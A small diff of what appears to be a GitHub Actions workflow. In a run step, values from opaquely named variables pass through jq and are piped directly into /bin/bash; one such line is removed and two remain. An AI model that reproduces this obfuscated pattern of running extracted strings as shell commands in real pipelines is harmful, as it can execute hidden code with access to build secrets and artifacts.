@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$po352" | jq -r .yy7969 | /bin/bash
           echo $b550 | jq -r .wokyp539 | /bin/bash
-          printf '%s' "$xfyy8691" | jq -r .qfxs14413 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
